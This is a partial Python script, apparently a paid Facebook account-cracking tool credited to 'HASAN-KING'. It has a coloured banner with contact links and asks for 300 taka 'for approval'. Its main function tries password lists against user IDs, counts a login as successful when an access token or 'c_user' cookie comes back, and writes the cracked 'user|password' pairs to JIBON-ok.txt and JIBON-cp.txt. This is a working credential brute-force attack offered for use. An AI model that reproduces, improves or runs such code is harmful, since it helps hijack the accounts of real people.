...
def logo():
	print("""%s
           ...
           '\x1b[38;5;10m' ░╚════╝░╚═╝╚═════╝░░╚════╝░╚═╝░░╚══╝
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;91mAUTHOR   : HASAN-KING           \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : FUCKBD71                \033[1;93m▇▇
             ...
             \033[1;93m▇▇➣    \033[1;94mGIVE ME 300 tk FOR APPROVAL \033[1;93m▇▇
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
...
def chigozie():
    ...
    try:
        ...
        os.system('espeak       xdg-open https://wa.me/+8801944408580')
        bsn_menu()
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print("             [*]. CREATED BY : HASAN-KING");time.sleep (0.03)
    print("             [*]. FACEBOOK   : UPDATE.DARK.CYBER.BD71");time.sleep (0.03)
    print("             [*]. GITHUB     : FUCKBD71");time.sleep (0.03)   
    ...
    def __api__(self, user, __chi__):
        ...
        for pw in __chi__:
            ...
            if "access_token" in p:
                ...
                os.system('espeak   " Configuration,  You,  Ok,  Id"')
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('JIBON-ok.txt' , 'a').write('%s\n' % wrt)
                break
                ...
                try:
                    ...
                    os.system('espeak   " Sorry,  Your,  Cp,  Id"')
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('JIBON-cp.txt' , 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    os.system('espeak    " Congratulation,  Your,  Ok,  Id"')
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('JIBON-ok.txt' , 'a').write('%s\n' % wrt)
